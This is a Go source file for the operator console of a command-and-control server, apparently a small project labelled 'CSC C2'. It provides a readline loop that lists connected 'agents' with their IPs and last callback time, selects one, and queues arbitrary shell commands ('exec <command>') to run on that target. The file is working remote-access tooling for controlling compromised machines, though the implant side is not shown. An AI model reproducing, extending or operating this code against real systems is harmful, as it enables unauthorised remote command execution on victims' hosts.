package c2

import (
	"fmt"
	"github.com/chzyer/readline"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var helpMenu string = `
CSC C2 v0.0.1 (2024-03-01)
-------------------------------------------
Main menu commands:
Command                  Description
-------------------------------------------
help                     Show this menu
clear                    Clear the console
agent <agent_name>		 Interact with target agent
exec <command>			 Execute command on target
agents                   List active agents
exit                     Exit C2
-------------------------------------------

`

var CurrentAgent *Agent

// StartCLI starts the pseudo console loop
func StartCLI() {
	// Init readline autoCompleter
	autoCompleter := readline.NewPrefixCompleter(
		readline.PcItem("clear"),
		readline.PcItem("help"),
		readline.PcItem("agents"),
		readline.PcItem("exit"),
	)

	// Init readline
	rl, err := readline.NewEx(&readline.Config{
		Prompt:          "C2 > ",       // Readline prompt to be inserted on every line
		AutoComplete:    autoCompleter, // Add our auto completer object
		InterruptPrompt: "^C",          // "^C" = "Ctrl + C"
		EOFPrompt:       "exit",        // Exit CLI with "exit command"
	})
	if err != nil {
		log.Fatal(err)
	}

	// Defer readline close until function exit
	defer rl.Close()

	// Create history file to log commands
	historyFile, err := os.OpenFile("c2/data/.history", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer historyFile.Close()

	// Main CLI loop
	for {
		// Read command from CLI
		command, err := rl.Readline()
		if err != nil {
			log.Fatal(err)
		}

		// Write command to history file
		if _, err := historyFile.WriteString(command + "\n"); err != nil {
			fmt.Println(err)
		}

		// Trim spaces from command
		command = strings.TrimSpace(command)
		if CurrentAgent != nil {
			rl.SetPrompt(fmt.Sprintf("C2 %s > ", CurrentAgent.Id))
		} else {
			rl.SetPrompt("C2 > ")
		}

		// Command logic switch
		switch {
		case command == "exit": // Exit command logic
			{
				fmt.Println("[C2] Shutting down C2, goodbye...")
				os.Exit(0)
			}
		case command == "help": // Help command logic
			{
				fmt.Print(helpMenu)
			}
		case command == "clear": // Clear command logic
			{
				if err := clearConsole(); err != nil {
					fmt.Println(err)
				}
			}
		case command == "agents": // List agents logic
			{
				for _, agent := range AgentMap.Agents {
					fmt.Printf("ID: %s IP: %s, Last Call: %.0f\n", agent.Id, agent.Ip, time.Since(agent.LastCall).Seconds())
				}
			}
		case strings.HasPrefix(command, "agent "):
			{
				agentId := strings.TrimPrefix(command, "agent ")
				if agent := AgentMap.Get(agentId); agent != nil {
					CurrentAgent = agent
					// TODO: Log agent call backs to file
					rl.SetPrompt(fmt.Sprintf("C2 %s > ", CurrentAgent.Id))
					rl.SetPrompt(fmt.Sprintf("C2 %s > ", CurrentAgent.Id))
				} else {
					fmt.Printf("Agent '%s' does not exist\n", agentId)
				}
			}
		case strings.HasPrefix(command, "exec "):
			{
				if CurrentAgent == nil {
					fmt.Println("No agent selected!")
					continue
				}

				cmd := strings.TrimPrefix(command, "exec ")
				fullCmd := strings.Split(cmd, " ")
				AgentMap.Enqueue(CurrentAgent.Id, fullCmd)
			}
		}

	}
}

// clearConsole clears the console
// OS-agnostic
func clearConsole() error {
	var cmd *exec.Cmd
	// Check which OS we are on
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	// Redirect stdout
	cmd.Stdout = os.Stdout
	return cmd.Run()
}
